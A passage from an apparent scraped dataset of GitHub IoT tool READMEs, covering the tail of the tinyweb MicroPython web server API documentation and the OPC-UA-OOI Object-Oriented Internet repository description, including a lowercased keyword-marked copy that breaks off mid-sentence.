is very important to limit it mostly because of memory constrain. default value depends on platform, 3 for esp8266, 6 for esp32 and 10 for others.\nbacklog - parameter to socket.listen() function. defines size of pending to be accepted connections queue. must be greater than max_concurrency.\ndebug - whether send exception info (text + backtrace) to client together with http 500 or not.\nadd_route(self, url, f, **kwargs) - map url into function f. additional keyword arguments are supported:\nmethods - list of allowed methods. defaults to ['get', 'post']\nsave_headers - due to memory constrains you most likely want to minimze memory usage by saving only headers which you really need in. e.g. for post requests it is make sense to save at least 'content-length' header. defaults to empty list - [].\nmax_body_size - max http body size (e.g. post form data). be careful with large forms due to memory constrains (especially with esp8266 which has 64k ram). defaults to 1024.\nallowed_access_control_headers - whenever you're using xmlhttprequest (send json from browser) these headers are required to do access control. defaults to *\nallowed_access_control_origins - the same idea as for header above. defaults to *.\n@route - simple and useful decorator (inspired by flask). instead of using add_route() directly - just decorate your function with @route, like this:\n@app.route('/index.html')\nasync def index(req, resp):\nawait resp.send_file('static/index.simple.html')\nadd_resource(self, cls, url, **kwargs) - restapi: map resource class cls to url. class cls is arbitrary class with with implementation of http methods:\nclass customerslist():\ndef get(self, data):\n\"\"\"return list of all customers\"\"\"\nreturn {'1': {'name': 'jack'}, '2': {'name': 'bob'}}\ndef post(self, data):\n\"\"\"add customer\"\"\"\ndb[str(next_id)] = data\nreturn {'message': 'created'}, 201\n**kwargs are optional and will be passed to handler directly. note: only get, post, put and delete methods are supported. check restapi full example as well.\n@resource - the same idea as for route but for resource:\n# regular version\n@app.resource('/user/<id>')\ndef user(data, id):\nreturn {'id': id, 'name': 'foo'}\n# generator based / different http method\n@app.resource('/user/<id>', method='post')\nasync def user(data, id):\nyield '{'\nyield '\"id\": \"{}\",'.format(id)\nyield '\"name\": \"test\",'\nyield '}'\nrun(self, host=\"127.0.0.1\", port=8081, loop_forever=true, backlog=10) - run web server. since tinyweb is fully async server by default it is blocking call assuming that you've added other tasks before.\nhost - host to listen on\nport - port to listen on\nloop_forever - run async.loop_forever(). set to false if you don't want run to be blocking call. be sure to call async.loop_forever() by yourself.\nbacklog - size of pending connections queue (basically argument to listen() function)\nshutdown(self) - gracefully shutdown web server. meaning close all active connections / server socket and cancel all started coroutines. note be sure to it in event loop or run event loop at least once, like:\nasync def all_shutdown():\nawait asyncio.sleep_ms(100)\ntry:\nweb = tinyweb.webserver()\nweb.run()\nexcept keyboardinterrupt as e:\nprint(' ctrl+c pressed - terminating...')\nweb.shutdown()\nuasyncio.get_event_loop().run_until_complete(all_shutdown())\nclass request\nthis class contains everything about http request. use it to get http headers / query string / etc. warning - to improve memory / cpu usage strings in request class are binary strings. this means that you must use b prefix when accessing items, e.g.\n>>> print(req.method)\nb'get'\nso be sure to check twice your code which interacts with request class.\nmethod - http request method.\npath - url path.\nquery_string - url path.\nheaders - dict of saved http headers from request. **only if enabled by save_headers.\nif b'content-length' in self.headers:\nprint(self.headers[b'content-length'])\nread_parse_form_data() - by default (again, to save cpu/memory) tinyweb doesn't read form data. you have to call it manually unless you're using restapi. returns dict of key / value pairs.\nclass response\nuse this class to generate http response. please be noticed that response class is using regular strings, not binary strings as request class does.\ncode - http response code. by default set to 200 which means ok, no error.\nversion - http version. defaults to 1.0. please be note - that only http1.0 is internally supported by tinyweb. so if you changing it to 1.1 - be sure to support protocol by yourself.\nheaders - http response headers dictionary (key / value pairs).\nadd_header(self, key, value) - convenient way to add http response header\nkey - header name\nvalue - header value\nadd_access_control_headers(self) - add http headers required for restapi (json query)\nredirect(self, location) - generate http redirection (http 302 found) to location. this function is coroutine.\nstart_html(self)- start response with html content type. this function is coroutine. this function is basically sends response line and headers. refer to hello world example.\nsend(self, payload) - sends your string/bytes payload to client. be sure to start your response with start_html() or manually. this function is coroutine.\nsend_file(self, filename): send local file as http response. file type will be detected automatically unless you explicitly change it. if file doesn't exists - http error 404 will be generated. additional keyword arguments\ncontent_type - mime filetype. by default - none which means autodetect.\ncontent_encoding - specifies used compression type, e.g. gzip. by default - none which means don't add this header.\nmax_age - cache control. how long browser can keep this file on disk. value is in seconds. by default - 30 days. to disable caching, set it to 0.\nerror(self, code) - generate http error response with error code. this function is coroutine.", "sortedWord": "None", "removed": "Nan", "score": null, "comments": null, "media": "Nan", "medialink": "Nan", "identifyer": 7000472, "year": null}, {"Unnamed: 0": 476, "autor": 476, "date": null, "content": "Object-Oriented Internet\nPreface\nObject-Oriented Internet - Machines to Machine Meaningful Interoperability\nIt is said that we are or soon will be citizens of a global village - a world considered as a single community linked by telecommunications. All applications designed atop of network communication can be grouped as follows:\nhuman-centric - applications where the information origin or information destination is an operator\nmachine-centric - applications where information creation, consumption, networking, and processing are achieved entirely without human interaction\nA typical human-centric approach is web-service supporting, for example, online bank account management. In this case, it is essential that any uncertainty and necessity to make a decision can be relaxed by human interaction. Coordination of multi-robot behavior in a work-cell or autonomous cars entering a service area fulfills the machine-centric scenario. It is crucial that, in this case, any human interaction is impractical or even impossible. This interoperability scenario requires a machine to machine communication (M2M) demanding multi-vendor devices integration.\nThe human-centric global village is almost done. However, the machine-centric global village still needs design and development effort. Information and Communication Technology (ICT) has provided society with a vast variety of distributed machine-oriented applications including the meaningful Machine to Machine (M2M) communication targeting distributed mobile applications in the context of new emerging disciplines, i.e. Industry 4.0 (I40) and Internet of Things (IoT). However, it is a real challenge if the mentioned machines are provided by a vast variety of vendors. The real challenge we are facing is how to produce independently smart things (i.e. machines, devices, appliances, assets, etc.) to guarantee that they are plug and produce ready. There are no doubts, it requires standardization. I believe that while producing the machines in compliance with the OPC Unified Architecture this issue is relaxed by applying the following OPC UA standardized concepts:\nInformation Model - all about how to design a formal but mutually meaningful and shareable description of the considered process\nAddress Space - all about how to instantiate and expose to the network a life replica of the process providing real-time data according to the above-mentioned formal description\nThe standardization process may be \"paper-driven\" or \"community-driven\". In both cases, standardization is indispensable but not sufficient. Let me recall that the foundation for the human-centric global village is just the Internet Protocol defined in 1981 and derived from the academic abstract knowledge and practitioners' concrete experience. It is worth stressing that it was published as an open-access document (RFC 791) and it has not been deprecated yet.\nThis umbrella project targets multi-vendor plug-and-produce machines interoperability scenarios targeting all aspects of the machine-centric global village concept aimed at providing reusable deliverables, training, best practice rules, prototyping, compliance testing and dissemination of valuable results.\nI am a researcher who is passionate about applying knowledge and experience in building a machine-centric global village. Let's build it with you and for you. To join our effort and create an organization context I have launched the Object-Oriented Internet Partnership Program.\nConsider joining as a sponsor, contributor or end-user. Details are covered by the section How to be involved\nYour participation is needed to make sure the work will continue as expected.\nWhat is Object Oriented Internet\nIn this project, C# deliverables supporting a new Machine To Machine (M2M) communication approach based on the Data-Oriented Architecture (DOA) paradigm is to be researched. The goal is to provide a generic solution for publishing and updating information in a context that can be used to describe and discover it by software applications. It is implemented based on the OPC Unified Architecture (OPC UA)- an industrial integration standard that fulfills the proposed architecture requirements.\nThe Object Oriented Internet article published in Proceedings of the Federated Conference on Computer Science and Information Systems captures description of this idea.\nGo To Description\nlatest release\nthe ebook Object Oriented Internet contains description of this project - it is auto-generated content gathered from *.md files from this repository.\nyou can cite all versions by using the DOI 10.5281/zenodo.1198852. This DOI represents all versions, and will always resolve to the latest one.\nNote: the DOI number is a unique identifying number associated with the repository version. Visit the section How to cite the software and associated documentation files to learn how to create derived works and cite the origin.\nKeywords\nOPC, OPC UA, M2M communication, Client-Server, Publisher-Subscriber, Data Oriented Architecture, DOA, AMQP, MQTT, PubSub, OPC UA PubSub, Semantic-Data, Industry 4.0, I4.0, Internet Of Things, IoT, IIoT, Global Data Discovery, Security\nReleases\nWe use Semantic Versioning for versioning. For the versions available, see the releases on this repository. For your convenience, the versions of the repository, tools and NuGet packages has been listed in the next subsections.\nRepository\nVersion Milestone DOI Date\n6.1.2 Azure Gateway Implementation 1.0 Dec 18, 2020\n5.1.0 Semantic-Data ModelDesign Export 5.1.0 10.5281/zenodo.3345043 Jul 21, 2019\n5.0.2-Alpha Updated the UA Address Space build against OPC UA Specification 1.04; updated UANodeSet schema; added export to ModelDesign OPC UA Address Space Prototyping 10.5281/zenodo.2636426 Apr 11, 2019\n4.0.1 .NET Standard implementation, documentation improved, new code help documentation available, tested against Xamarin.Android 10.5281/zenodo.2555407 Feb 1, 2019\n3.1.0 New version of the UAOOI.Networking.ReferenceApplication, documentation has been improved. 10.5281/zenodo.1291549 Jun 17, 2018\n3.0.0 DOI creation for the publication purpose. 10.5281/zenodo.1198853 Mar 14, 2018\nTools\nThe table below lists the latest versions of the published Tools.\nDescription Version\nOPC UA Address Space Prototyping 5.1.0\nSemantic-Data Processing ReferenceApplication 4.00.01\nNuGet packages\nThe table below lists the latest versions of the published NuGet packages.\nId Version Description\nUAOOI.Common.Infrastructure 4.0.1 This library provides API for common infrastructure management functionality aimed at Object Oriented Internet application deployment.)\nUAOOI.Configuration.Core 4.0.1 The library contains a shared interfaces for server configuration which OPC UA applications can reference. The library provides an abstraction over any OPC UA Server configuration plug-in. Using the library allows an application to indirectly access the server configuration attributes without relying on hard references. The hope is that using this library, third-party applications and frameworks can begin to leverage server configuration management without tying themselves down to a specific implementation.\nUAOOI.Configuration.DataBindings 4.0.1 OPC UA Object Oriented Internet (UAOOI) DataBindings library is dedicated to create a plug-in aimed at editing of the configuration of any application based on OPC UA Information Model. It allows also to add data binding to the configuration.\nUAOOI.Configuration.Networking 4.0.1 OPC UA Object Oriented Internet (UAOOI) UAOOI.Configuration.Networking library is dedicated to create a plug-in aimed at provisioning configuration of any application based on OPC UA Information Model.\nUAOOI.Networking.Core 4.0.2 The core functionality of Semantic-Data reactive networking library based on OPC UA Part 14 Pub/Sub.\nUAOOI.Networking.Encoding 4.0.2 This package provides functionality to lookup a dictionary containing value converters. The interface is used for late binding to inject dependency on the external library. This library provides IEncodingFactory functionality limited to encoding simple data types only for the testing purpose only.\nUAOOI.Networking.SemanticData 4.0.2 SemanticData Reactive Networking library based on OPC UA Part 14 Pub/Sub.\nUAOOI.Networking.UDPMessageHandler 4.0.2 OOI Reactive Networking: UDP IMessageHandlerFactory Implementation\nUAOOI.SemanticData.InformationModelFactory 5.1.0 OPC UA Information Model Factory Library\nUAOOI.SemanticData.UANodeSetValidation 5.1.0 This project supports validation of the OPC UA Address Space captured in the XML file against the OPC UA Specification. It is assumed that the Address Space is represented as an XML file compliant with the NodeSet schema. This library is dedicated to creating a plug-in aimed at importing models based on the OPC UA Information Model. It is part of the project supporting OPC UA Object Oriented Internet paradigm.\nUAOOI.SemanticData.UAModelDesignExport 5.1.0 This library provides an implementation of the export functionality of an XML file compliant with the UAModelDeign schema. By design, the UAModelDeign schema describes the syntax of an XML document representing the OPC UA Information Model.\nUAOOI.SemanticData.BuildingErrorsHandling 5.1.0 It provides descriptions of building errors to be used for OPC UA Address Space consistency validation purpose.\nContent\nArchitecture\nThe repository workspace are organized as it is illustrated in the Figure below.\nNext sections describe the content of the packages in the repository. The packages are loosely coupled. Each package contains applications (tools), libraries, and unit tests. All common resources are collected in the CommonResources.\nCommon\nThis workspace provides API for common infrastructure management functionality aimed at Object Oriented Internet application deployment.\nConfiguration\nThis workspace is aimed at implementing an editor of the OOI Reactive Application configuration file. It contains types that supports the configuration management of application implementing the paradigm described in Semantic-Data Processing Architecture. The configuration may be read to or write from the xml or json files. By design this library may be used to support variety kinds of applications at design and run time. It supports also the data binding mechanism to define how the process data relate to the real world.\nDataDiscovery\nThis workspace contains libraries and tools to find the data over the network. In the proposed approach the URI of the OPC UA Information Model is to be used as a unique key to browse the Global Data Discovery System (GDDS \u05a0an expanded version of GDS) to find recursively the destination OPC UA Server or UA Data Application exposing the requested data.\nTo get more details visit the section Global Data Discovery\nNetworking\nThis workspace contains library empowering the Industrial Internet of Things (IIoT) and Industry 4.0. as the result of using reactive networking paradigm. Intentionally it is designed on top of OPC UA Part 14 Pub/Sub protocol supporting interoperability with any product compliant with this specification. Seamless integration with AMQP, MQTT, etc. allows meaningful data transfer in the context of semantics defined using OPC UA Information Model.\nTo get more details visit the section Internet of Things (IoT) Communication\nSemanticData\nIntroduction\nThe SemanticData folder contains projects related to support the OOI Semantic-Data Processing Architecture. Processing of the OPC UA Data Outside of the Server context is based on the Semantic-Data concept. This project is aimed to workout deliverables supporting Process Data handling over Internet including but not limiting to:\nData edition \u05a0UI allowing display and edition of any custom data\nData serialization and deserialization - see white-paper Address Space Interchange XML\nData prototyping - methods and tools to design custom data types\nExposition of the process data in the context of metadata OPC UA Address Space Model Designer\nBrowsing of the Metadata to selectively access requested Process Data\nModeling and representation of the metadata - detailed description is covered by the section OPC UA Information Model Deployment\nValidation of the semantics and consistency of the metadata - see project USNodeSetValidationUnitTestProject\nData Oriented Architecture (DOA)\nProject AddressSpaceComplianceTestTool\nIt is a command-line application aimed at the validation of the XML files compliant with the UANodeSet schema defined in Part 6 of the OPC UA Specification. The description of this schema is captured by the document Address Space Interchange XML\nProject UANodeSetValidation\nThe UANodeSetValidation project is a library aimed at validate UANodeSet xml files.\nTo validate a new model add the code to the USNodeSetValidationUnitTestProject and XML file to the XMLModels in this project. If the validation test does not recognize an error the code in the UANodeSetValidation must be improved.\nIn this case add issue or modify the code on your fork and add pull request after finishing.\nPublic API: The public API for this project is defined by the interface:\nIAddressSpaceContext\nThis interface may be used for dependency injection where validation of the input data conforming to the UANodeSet schema is processed.\nProject InformationModelFactory\nThe project is dedicated to develop the OPC UA Information Model Factory Library. It is a library used as the dependency injection to produce OPC UA Information Model by a selected importer. The abstract API must be implemented by a classes providing functionality of Information Model creation.\nDetailed description is covered by the document InformationModelFactory Library\nRelated work\nOPC UA Address Space Model Designer (ASMD)\nThe main challenge of the project OPC UA Address Space Model Designer (ASMD) is to offer the designers a user-friendly tool supporting all aspects of the OPC UA Address Space model designing process. It brings together: designing, learning, and deploying. Description of the main features of the tool is covered by the section Design and Deployment Support.\nThe OPC UA Address Space Model Designer (ASMD) implements conceptual containers called solutions and projects to apply their settings. Any solution contains one or more projects and it manages the way the designer configures, builds, and deploys sets of related projects. Any project includes source files containing the model representation and related metadata such as properties and references to other projects. The designer Integrated Development Environment (IDE) provides tools that help you edit and manipulate models, namespaces, and add references to external resources.\nProcess-Observer (PO)\nProcess-Observer (PO) is an archetype that allows creation consistent, homogeneous real-time representation of the underlying process. This representation is a kind of a process state and behavior replica, which exposes real-time process data to the network using standardized interfaces like OPC Classic, OPC Unified Architecture, OPC PubSub, AMQP, MQTT, etc. In other words, it supports Machine to Sensors Connectivity (M2S), i.e. it allows an open, uniform, secure and standards-based communication solution between sensors, actuators, controllers and the upper layer applications.\nA detailed description of this concept is covered by the article Object Oriented Internet. By design this concept supports\nProcess Devices Interconnection - synchronization of the process replica with the process state\nProcess Simulation - simulation of the process behavior to recover unavailable data and ensure a safe testing environment\nResource Monitoring - allowing to add information processing and networking infrastructure to be exposed consistently aggregated with the process replica\nServer to Server Interactions - supports a scenario in which PO is the Client of a Server\nThe PO concept has been implemented as a generic communication engine used by the CAS CommServer Classic and Unified Architecture servers. This implementation is optimized for highly distributed applications. This implementation is maintained in the mpostol/ProcessObserver repository.\nCommServer\nCommServer is a package of software to manage data transfer using OPC standards. Built-in technologies and algorithms support Machine to Machine (M2M) meaningful interoperability. The CommServer was written by CAS Lodz Poland.\nThe GitHub repository commsvr-com/migration2os is aimed at the CommServer software migration from on-premise subversion repository to GitHub and publishing it as the Open-Source Software (OSS). The members of the CommServer family are to be converged with the Object-Oriented Internet paradigms and integrated with the solutions maintained in this repository.\nObject Oriented Internet Reactive Networking Configuration Editor\nOPC-UA-OOI.ConfigEditor is a package of software to manage the configuration of the Reactive Communication. The OPC-UA-OOI.ConfigEditor was written by CAS Lodz Poland. The mpostol/OPC-UA-OOI.ConfigEditor repository is aimed at the software migration from on-premise subversion repository to GitHub and publishing it as the Open-Source Software (OSS). After migration, this repository will be used to manage all activities addressing the software maintenance process as a plug-in of the ASMD.\nHow to cite the software and associated documentation files\nTo be compliant with the license of the repository the below copyright notice shall be included in all copies or substantial portions of the software and associated documentation files (the \"Software\").\nCopyright (c) 2020 Mariusz Postol\nIn this section, you will learn how to cite the \"Software\" using the DOI number. A DOI number is a unique identifying number for the Software version. Because this repository has a DOI, use the DOI in your citation for the article or any derived work, like this:\nMariusz Postol, Object Oriented Internet: [Target Part Name], https://github.com/mpostol/OPC-UA-OOI, [year] DOI: 10.5281/zenodo.1198852.\nor\nMariusz Postol, Object Oriented Internet: [Target Part Name], https://github.com/mpostol/OPC-UA-OOI, [year] DOI: http://doi.org/10.5281/zenodo.1198852.\nReplace [year] with the current year and [Target Part Name] with the name (or names) of the files you are referring to.\nHow to follow up?\nGitHub offers Discussions as a space to connect with other members of the community. I hope that using the Discussion space you:\nask questions you\u2019re wondering about\nshare ideas\nengage with other community members\nwelcome others and are open-minded; remember that this is a community we build together\nI have activated the Discussion space for this repository. Follow the Discussion to be in touch.\nTo follow any activity in the repository, switch on the Watch functionality. If you find the project interesting, please star the repository. Starring a repository also shows appreciation to the repository maintainer for their work. You can star repositories and topics to keep track of projects you find interesting and discover related content in your news feed. Check out Saving repositories with stars to get more.\nConclusion\nI hope it is a good place to prototype and converge the OPC UA communication technology with Semantic-Data, Industry 4.0, Internet Of Things, Data Oriented Architecture, Plug and Play, Global Data Discovery, Selective Availability, etc. concepts. My goal is to bridge a gap between OPC UA technology and Industrial IT Application Domains.\nThe presented approach is a real proposal for a new technology wave based on the existing Internet infrastructure because it allows vendors to provide generic off-the-shelf products tested independently for interoperability.\nPartnership Program\nI am a researcher and University associate who is passionate about applying knowledge and experience in building a Machine to Machine (M2M) meaningful interoperability based on OPC UA. Let's build it with you and for you. To join our effort and create an organizational context I have launched an open-access Object-Oriented Internet Partnership Program. Hence, maintenance of this repository and further development of the OPC UA Information Model Domain-Specific Language will be carried out under a broader concept described in the following article\nObject-Oriented Internet Partnership Program\nConsider joining. Visit the section How to be involved to get more. I hope that thanks to this partnership program we will establish long-term mutually beneficial cooperation. Your participation is needed to make sure that the work will continue as expected. As a rule of thumb, the work priority is derived from community feedback.\nI strongly encourage community participation and contribution to this project. First, please fork the repository and commit your changes there. Once happy with your changes you can generate a 'pull request'.\nWhen contributing to this repository, please first discuss the change you wish to make via issue, email, or any other method with the owners of this repository before making a change.\nPlease note we have a code of conduct, please follow it in all your interactions with the project.\nSee Also\nPublications\nObject-Oriented Internet This playlist on YouTube addresses research results on the systematic approach to the design of the meaningful Machine to Machine (M2M) communication targeting distributed mobile applications in the context of new emerging disciplines, i.e. Industry 4.0 and Internet of Things.\nPost\u00f3\u0142 M., Szymczak P. (2021) Object-Oriented Internet Cloud Interoperability. In: Paszynski M., Kranzlm\u00fcller D., Krzhizhanovskaya V.V., Dongarra J.J., Sloot P.M. (eds) Computational Science \u2013 ICCS 2021. ICCS 2021. Lecture Notes in Computer Science, vol 12745. Springer, Cham. https://doi.org/10.1007/978-3-030-77970-2_43\nAvailable on ResearchGate\nICCS 2021: INTERNATIONAL CONFERENCE ON COMPUTATIONAL Presentation is available on YouTube\nPost\u00f3\u0142 M. (2020) Object-Oriented Internet Reactive Interoperability. In: Krzhizhanovskaya V. et al. (eds) Computational Science \u2013 ICCS 2020. ICCS 2020. Lecture Notes in Computer Science, vol 12141. Springer, Cham; DOI: https://doi.org/10.1007/978-3-030-50426-7_31\nPost\u00f3\u0142 M. (2020) Object-Oriented Internet Reactive Interoperability, presentation, DOI: 10.13140/RG.2.2.33984.56323\nMariusz Postol, Machine to Machine Semantic-Data Based Communication: Comprehensive Survey chapter in book Computer Game Innovations 2018, Publisher: Lodz University of Technology Press; ISBN: 978-83-7283-999-2\nebook Object Oriented Internet contains description of this project - it is auto-generated content gathered from *.md files\nMariusz Postol, Object Oriented Internet, 3rd International Conference on Innovative Network Systems and Applications, 2015, IEEE Xplore Digital Library\nRelated documents\nObject-Oriented Internet Partnership Program\nHow to be involved\nWIKI of this project\nAPI Browser (is available for sponsors - consider joining)\nOPC UA Address Space Model Designer (ASMD)\nMy Blog: About enablers of future solutions\nOPC Unified Architecture \u2013 Main Technological Features\nAbout me on LinkedIn\nReferences - this section contains links to selected internal and external resources.\nRelated websites\nOPC Foundation\nSponsored by commsvr.com", "link": "https://github.com/mpostol/OPC-UA-OOI", "origin": "Github", "suborigin": "Iot", "result": true, "Selector": "tool", "selectorShort": "tool", "MarkedSent": "object-oriented internet\npreface\nobject-oriented internet - machines to machine meaningful interoperability\nit is said that we are or soon will be citizens of a global village - a world considered as a single community linked by telecommunications. all applications designed atop of network communication can be grouped as follows:\nhuman-centric - applications where the information origin or information destination is an operator\nmachine-centric - applications where information creation, consumption, networking, and processing are achieved entirely without human interaction\na typical human-centric approach is web-service supporting, for example, online bank account management. in this case, it is essential that any uncertainty and necessity to make a decision can be relaxed by human interaction. coordination of multi-robot behavior in a work-cell or autonomous cars entering a service area fulfills the machine-centric scenario. it is crucial that, in this case, any human interaction is impractical or even impossible. this interoperability scenario requires a machine to machine communication (m2m) demanding multi-vendor devices integration.\nthe human-centric global village is almost done. however, the machine-centric global village still needs design and development effort. information and communication technology (ict) has provided society with a vast variety of distributed machine-oriented applications including the meaningful machine to machine (m2m) communication targeting distributed mobile applications in the context of new emerging disciplines, i.e. industry 4.0 (i40) and internet of things (iot). however, it is a real challenge if the mentioned machines are provided by a vast variety of vendors. the real challenge we are facing is how to produce independently smart things (i.e. machines, devices, appliances, assets, etc.) to guarantee that they are plug and produce ready. there are no doubts, it requires standardization. i believe that while producing the machines in compliance with the opc unified architecture this issue is relaxed by applying the following opc ua standardized concepts:\ninformation model - all about how to design a formal but mutually meaningful and shareable description of the considered process\naddress space - all about how to instantiate and expose to the network a life replica of the process providing real-time data according to the above-mentioned formal description\nthe standardization process may be \"paper-driven\" or \"community-driven\". in both cases, standardization is indispensable but not sufficient. let me recall that the foundation for the human-centric global village is just the internet protocol defined in 1981 and derived from the academic abstract knowledge and practitioners' concrete experience. it is worth stressing that it was published as an open-access document (rfc 791) and it has not been deprecated yet.\nthis umbrella project targets multi-vendor plug-and-produce machines interoperability scenarios targeting all aspects of the machine-centric global village concept aimed at providing reusable deliverables, training, best practice rules, prototyping, compliance testing and dissemination of valuable results.\ni am a researcher who is passionate about applying knowledge and experience in building a machine-centric global village. let's build it with you and for you. to join our effort and create an organization context i have launched the object-oriented internet partnership program.\nconsider joining as a sponsor, contributor or end-user. details are covered by the section how to be involved\nyour participation is needed to make sure the work will continue as expected.\nwhat is object oriented internet\nin this project, c# deliverables supporting a new machine to machine (m2m) communication approach based on the data-oriented architecture (doa) paradigm is to be researched. the goal is to provide a generic solution for publishing and updating information in a context that can be used to describe and discover it by software applications. it is implemented based on the opc unified architecture (opc ua)- an industrial integration standard that fulfills the proposed architecture requirements.\nthe object oriented internet article published in proceedings of the federated conference on computer science and information systems captures description of this idea.\ngo to description\nlatest release\nthe ebook object oriented internet contains description of this project - it is auto-generated content gathered from *.md files from this repository.\nyou can cite all versions by using the doi 10.5281/zenodo.1198852. this doi represents all versions, and will always resolve to the latest one.\nnote: the doi number is a unique identifying number associated with the repository version. visit the section how to cite the software and associated documentation files to learn how to create derived works and cite the origin.\nkeywords\nopc, opc ua, m2m communication, client-server, publisher-subscriber, data oriented architecture, doa, amqp, mqtt, pubsub, opc ua pubsub, semantic-data, industry 4.0, i4.0, internet of things, iot, iiot, global data discovery, security\nreleases\nwe use semantic versioning for versioning. for the versions available, see the releases on this repository. for your convenience, the versions of the repository, tools and nuget packages has been listed in the next subsections.\nrepository\nversion milestone doi date\n6.1.2 azure gateway implementation 1.0 dec 18, 2020\n5.1.0 semantic-data modeldesign export 5.1.0 10.5281/zenodo.3345043 jul 21, 2019\n5.0.2-alpha updated the ua address space build against opc ua specification 1.04; updated uanodeset schema; added export to modeldesign opc ua address space prototyping 10.5281/zenodo.2636426 apr 11, 2019\n4.0.1 .net standard implementation, documentation improved, new code help documentation available, tested against xamarin.android 10.5281/zenodo.2555407 feb 1, 2019\n3.1.0 new version of the uaooi.networking.referenceapplication, documentation has been improved. 10.5281/zenodo.1291549 jun 17, 2018\n3.0.0 doi creation for the publication purpose. 10.5281/zenodo.1198853 mar 14, 2018\ntools\nthe table below lists the latest versions of the published tools.\ndescription version\nopc ua address space prototyping 5.1.0\nsemantic-data processing referenceapplication 4.00.01\nnuget packages\nthe table below lists the latest versions of the published nuget packages.\nid version description\nuaooi.common.infrastructure 4.0.1 this library provides api for common infrastructure management functionality aimed at object oriented internet application deployment.)\nuaooi.configuration.core 4.0.1 the library contains a shared interfaces for server configuration which opc ua applications can reference. the library provides an abstraction over any opc ua server configuration plug-in. using the library allows an application to indirectly access the server configuration attributes without relying on hard references. the hope is that using this library, third-party applications and frameworks can begin to leverage server configuration management without tying themselves down to a specific implementation.\nuaooi.configuration.databindings 4.0.1 opc ua object oriented internet (uaooi) databindings library is dedicated to create a plug-in aimed at editing of the configuration of any application based on opc ua information model. it allows also to add data binding to the configuration.\nuaooi.configuration.networking 4.0.1 opc ua object oriented internet (uaooi) uaooi.configuration.networking library is dedicated to create a plug-in aimed at provisioning configuration of any application based on opc ua information model.\nuaooi.networking.core 4.0.2 the core functionality of semantic-data reactive networking library based on opc ua part 14 pub/sub.\nuaooi.networking.encoding 4.0.2 this package provides functionality to lookup a dictionary containing value converters. the interface is used for late binding to inject dependency on the external library. this library provides iencodingfactory functionality limited to encoding simple data types only for the testing purpose only.\nuaooi.networking.semanticdata 4.0.2 semanticdata reactive networking library based on opc ua part 14 pub/sub.\nuaooi.networking.udpmessagehandler 4.0.2 ooi reactive networking: udp imessagehandlerfactory implementation\nuaooi.semanticdata.informationmodelfactory 5.1.0 opc ua information model factory library\nuaooi.semanticdata.uanodesetvalidation 5.1.0 this project supports validation of the opc ua address space captured in the xml file against the opc ua specification. it is assumed that the address space is represented as an xml file compliant with the nodeset schema. this library is dedicated to creating a plug-in aimed at importing models based on the opc ua information model. it is part of the project supporting opc ua object oriented internet paradigm.\nuaooi.semanticdata.uamodeldesignexport 5.1.0 this library provides an implementation of the export functionality of an xml file compliant with the uamodeldeign schema. by design, the uamodeldeign schema describes the syntax of an xml document representing the opc ua information model.\nuaooi.semanticdata.buildingerrorshandling 5.1.0 it provides descriptions of building errors to be used for opc ua address space consistency validation purpose.\ncontent\narchitecture\nthe repository workspace are organized as it is illustrated in the figure below.\nnext sections describe the content of the packages in the repository. the packages are loosely coupled. each package contains applications (tools), libraries, and unit tests. all common resources are collected in the commonresources.\ncommon\nthis workspace provides api for common infrastructure management functionality aimed at object oriented internet application deployment.\nconfiguration\nthis workspace is aimed at implementing an editor of the ooi reactive application configuration file. it contains types that supports the configuration management of application implementing the paradigm described in semantic-data processing architecture. the configuration may be read to or write from the xml or json files. by design this library may be used to support variety kinds of applications at design and run time. it supports also the data binding mechanism to define how the process data relate to the real world.\ndatadiscovery\nthis workspace contains libraries and tools to find the data over the network. in the proposed approach the uri of the opc ua information model is to be used as a unique key to browse the global data discovery system (gdds \u05a0an expanded version of gds) to find recursively the destination opc ua server or ua data application exposing the requested data.\nto get more details visit the section global data discovery\nnetworking\nthis workspace contains library empowering the industrial internet of things (iiot) and industry 4.0. as the result of using reactive networking paradigm. intentionally it is designed on top of opc ua part 14 pub/sub protocol supporting interoperability with any product compliant with this specification. seamless integration with amqp, mqtt, etc. allows meaningful data transfer in the context of semantics defined using opc ua information model.\nto get more details visit the section internet of things (iot) communication\nsemanticdata\nintroduction\nthe semanticdata folder contains projects related to support the ooi semantic-data processing architecture. processing of the opc ua data outside of the server context is based on the semantic-data concept. this project is aimed to workout deliverables supporting process data handling over internet including but not limiting to:\ndata edition \u05a0ui allowing display and edition of any custom data\ndata serialization and deserialization - see white-paper address space interchange xml\ndata prototyping - methods and tools to design custom data types\nexposition of the process data in the context of metadata opc ua address space model designer\nbrowsing of the metadata to selectively access requested process data\nmodeling and representation of the metadata - detailed description is covered by the section opc ua information model deployment\nvalidation of the semantics and consistency of the metadata - see project usnodesetvalidationunittestproject\ndata oriented architecture (doa)\nproject addressspacecompliancetesttool\nit is a command-line application aimed at the validation of the xml files compliant with the uanodeset schema defined in part 6 of the opc ua specification. the description of this schema is captured by the document address space interchange xml\nproject uanodesetvalidation\nthe uanodesetvalidation project is a library aimed at validate uanodeset xml files.\nto validate a new model add the code to the usnodesetvalidationunittestproject and xml file to the xmlmodels in this project. if the validation test does not recognize an error the code in the uanodesetvalidation must be improved.\nin this case add issue or modify the code on your fork and add pull request after finishing.\npublic api: the public api for this project is defined by the interface:\niaddressspacecontext\nthis interface may be used for dependency injection where validation of the input data conforming to the uanodeset schema is processed.\nproject informationmodelfactory\nthe project is dedicated to develop the opc ua information model factory library. it is a library used as the dependency injection to produce opc ua information model by a selected importer. the abstract api must be implemented by a classes providing functionality of information model creation.\ndetailed description is covered by the document informationmodelfactory library\nrelated work\nopc ua address space model designer (asmd)\nthe main challenge of the project opc ua address space model designer (asmd) is to offer the designers a user-friendly -----> tool !!!  supporting all aspects of the opc ua address space model designing process. it brings together: designing, learning, and deploying. description of the main features of the tool is covered by the section design and deployment support.\nthe opc ua address space model designer (asmd) implements conceptual containers called solutions and projects to apply their settings. any solution contains one or more projects and it manages the way the designer configures, builds, and deploys sets of related projects. any project includes source files containing the model representation and related metadata such as properties and references to other projects. the designer integrated development environment (ide) provides tools that help you edit and manipulate models, namespaces, and add references to external resources.\nprocess-observer (po)\nprocess-observer (po) is an archetype that allows creation consistent, homogeneous real-time representation of the underlying process. this representation is a kind of a process state and behavior replica, which exposes real-time process data to the network using standardized interfaces like opc classic, opc unified architecture, opc pubsub, amqp, mqtt, etc. in other words, it supports machine to sensors connectivity (m2s), i.e. it allows an open, uniform, secure and standards-based communication solution between sensors, actuators, controllers and the upper layer applications.\na detailed description of this concept is covered by the article object oriented internet. by design this concept supports\nprocess devices interconnection - synchronization of the process replica with the process state\nprocess simulation - simulation of the 